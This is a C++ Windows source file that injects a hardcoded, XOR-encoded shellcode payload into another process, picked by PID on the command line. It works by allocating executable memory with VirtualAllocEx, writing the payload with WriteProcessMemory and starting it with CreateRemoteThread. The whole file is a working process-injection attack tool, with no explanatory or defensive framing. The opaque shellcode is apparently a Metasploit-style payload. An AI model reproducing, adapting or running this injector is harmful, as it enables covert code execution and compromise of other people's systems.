﻿#include "Windows.h"
#include <iostream>


int main(int argc, char* argv[])

{

    unsigned char shellcode[] =

        "\x48\x31\xc9\x48\x81\xe9\xc6\xff\xff\xff\x48\x8d\x05\xef"
        "\xff\xff\xff\x48\xbb\x96\x99\xd0\xa2\xe6\x82\xba\x04\x48"
        "\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4\x6a\xd1\x53"
        "\x46\x16\x6a\x7a\x04\x96\x99\x91\xf3\xa7\xd2\xe8\x55\xc0"
        "\xd1\xe1\x70\x83\xca\x31\x56\xf6\xd1\x5b\xf0\xfe\xca\x31"
        "\x56\xb6\xd1\x5b\xd0\xb6\xca\xb5\xb3\xdc\xd3\x9d\x93\x2f"
        "\xca\x8b\xc4\x3a\xa5\xb1\xde\xe4\xae\x9a\x45\x57\x50\xdd"
        "\xe3\xe7\x43\x58\xe9\xc4\xd8\x81\xea\x6d\xd0\x9a\x8f\xd4"
        "\xa5\x98\xa3\x36\x09\x3a\x8c\x96\x99\xd0\xea\x63\x42\xce"
        "\x63\xde\x98\x00\xf2\x6d\xca\xa2\x40\x1d\xd9\xf0\xeb\xe7"
        "\x52\x59\x52\xde\x66\x19\xe3\x6d\xb6\x32\x4c\x97\x4f\x9d"
        "\x93\x2f\xca\x8b\xc4\x3a\xd8\x11\x6b\xeb\xc3\xbb\xc5\xae"
        "\x79\xa5\x53\xaa\x81\xf6\x20\x9e\xdc\xe9\x73\x93\x5a\xe2"
        "\x40\x1d\xd9\xf4\xeb\xe7\x52\xdc\x45\x1d\x95\x98\xe6\x6d"
        "\xc2\xa6\x4d\x97\x49\x91\x29\xe2\x0a\xf2\x05\x46\xd8\x88"
        "\xe3\xbe\xdc\xe3\x5e\xd7\xc1\x91\xfb\xa7\xd8\xf2\x87\x7a"
        "\xb9\x91\xf0\x19\x62\xe2\x45\xcf\xc3\x98\x29\xf4\x6b\xed"
        "\xfb\x69\x66\x8d\xeb\x58\xf5\xc9\x36\xc9\xaa\xe2\xa2\xe6"
        "\xc3\xec\x4d\x1f\x7f\x98\x23\x0a\x22\xbb\x04\x96\xd0\x59"
        "\x47\xaf\x3e\xb8\x04\x93\xa0\x10\x0a\xe6\xe8\xfb\x50\xdf"
        "\x10\x34\xee\x6f\x73\xfb\xbe\xda\xee\xf6\xa5\x19\x57\xf6"
        "\x8d\x7c\xf1\xd1\xa3\xe6\x82\xe3\x45\x2c\xb0\x50\xc9\xe6"
        "\x7d\x6f\x54\xc6\xd4\xe1\x6b\xab\xb3\x7a\x4c\x69\x59\x98"
        "\x2b\x24\xca\x45\xc4\xde\x10\x11\xe3\x5c\x68\xb5\xdb\x76"
        "\x66\x05\xea\x6f\x45\xd0\x14\xd7\xc1\x9c\x2b\x04\xca\x33"
        "\xfd\xd7\x23\x49\x07\x92\xe3\x45\xd1\xde\x18\x14\xe2\xe4"
        "\x82\xba\x4d\x2e\xfa\xbd\xc6\xe6\x82\xba\x04\x96\xd8\x80"
        "\xe3\xb6\xca\x33\xe6\xc1\xce\x87\xef\xd7\x42\xd0\x09\xcf"
        "\xd8\x80\x40\x1a\xe4\x7d\x40\xb2\xcd\xd1\xa3\xae\x0f\xfe"
        "\x20\x8e\x5f\xd0\xca\xae\x0b\x5c\x52\xc6\xd8\x80\xe3\xb6"
        "\xc3\xea\x4d\x69\x59\x91\xf2\xaf\x7d\x72\x49\x1f\x58\x9c"
        "\x2b\x27\xc3\x00\x7d\x5a\xa6\x56\x5d\x33\xca\x8b\xd6\xde"
        "\x66\x1a\x29\xe8\xc3\x00\x0c\x11\x84\xb0\x5d\x33\x39\x4a"
        "\xb1\x34\xcf\x91\x18\x40\x17\x07\x99\x69\x4c\x98\x21\x22"
        "\xaa\x86\x02\xea\x93\x50\x59\x06\xf7\xbf\xbf\xd1\x8a\xa2"
        "\xcd\x8c\x82\xe3\x45\x1f\x43\x2f\x77\xe6\x82\xba\x04";


    HANDLE processHandle;

    HANDLE remoteThread;

    PVOID remoteBuffer;


    // Используем cout вместо printf
    std::cout << "Injecting to PID: " << atoi(argv[1]) << std::endl;

    processHandle = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(atoi(argv[1])));
    remoteBuffer = VirtualAllocEx(processHandle, NULL, sizeof shellcode, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(processHandle, remoteBuffer, shellcode, sizeof shellcode, NULL);
    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    CloseHandle(processHandle);

    return 0;



    return 0;

}